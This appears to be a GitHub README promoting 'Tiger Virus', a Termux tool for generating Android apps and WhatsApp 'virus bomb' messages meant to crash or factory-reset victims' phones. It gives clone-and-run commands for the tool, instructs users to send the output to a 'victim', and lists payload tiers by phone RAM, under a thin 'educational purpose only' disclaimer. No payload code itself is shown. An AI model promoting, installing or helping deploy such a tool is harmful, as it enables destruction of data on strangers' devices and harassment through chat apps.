<h1>Tiger Virus </h1>

<h3>WELCOME TO TIGER VIRUS TOOL</h3>

*Best Virus Making Tool To Make Virus Applications and Messeges For Whatsapp And Other Chat Applications

<h4>Tool by <strong>The Devil Tigers</strong></h4>

![Screenshot_20201107-163215~2_compress68](https://user-images.githubusercontent.com/69100349/98444803-c3659900-2139-11eb-892f-86a352437f56.jpg)

*For more details see my youtube channel 

*Click :- [The Devil Tigers](https://www.youtube.com/c/thmalayalam)

<h3>How to run this Tool "Tiger Virus"</h3>

<h4>Commands</h4>

<h4>_________</h4>

$ apt update 

$ apt upgrade -y

$ pkg install git -y

$ git clone https://github.com/Devil-Tigers/TigerVirus.git

$ cd TigerVirus

$ bash TigerVirus.sh

After Installation the Virus Applications or text file
Send To Victim If Application

copy and past on whatsapp and sent if Text

*Enjoy*

<h4>Screenshots </h4>

![Screenshot_20210401-111946](https://user-images.githubusercontent.com/69100349/113250775-c591e500-92de-11eb-8442-ced8319793f4.png)



![Screenshot_20210401-111957](https://user-images.githubusercontent.com/69100349/113250952-1570ac00-92df-11eb-846f-7e583aaa44a1.png)

![Capture 2020-11-07 20 29 57](https://user-images.githubusercontent.com/69100349/98444702-2571ce80-2139-11eb-82e3-50daac2c9e62.jpg)

![Capture 2020-11-07 20 34 39](https://user-images.githubusercontent.com/69100349/98444733-4df9c880-2139-11eb-8c83-a928e5c2d0b8.jpg)

![Capture 2020-11-07 20 35 37](https://user-images.githubusercontent.com/69100349/98444754-741f6880-2139-11eb-9a1e-8bcba51a76f8.jpg)

<h3>2 options at First </h3>

*1) Virus Applications (new 2021 ) 

When Any One Install It. Their Phone Will Be Damaged and Reset!

*2) Virus Messeges For Whatsapp And Other Chat Apps !

<h4>4 options</h4>

 

 

 

*Minimum Range for (under 2GB Ram Mobile Phones)

*Medium Range for (More than 2GB Ram Mobile Phones)

*Maximum Range for (4GB Ram or More than 4GB Mobile phones)

*Tiger Power Bomb for (4GB+ Ram mobile phones)

<h5>10 Types of virus bomb messages in every option</h5> 

<h5>Total 30 virus bomb messages </h5>

<h5>1 Tiger power message </h5>

<h5>Testing</h5> 

*script by THE DEVIL TIGERS

©[The Devil Tigers](https://www.youtube.com/c/thmalayalam)

<h3>FOR EDUCATIONAL PURPOSE ONLY</h3>


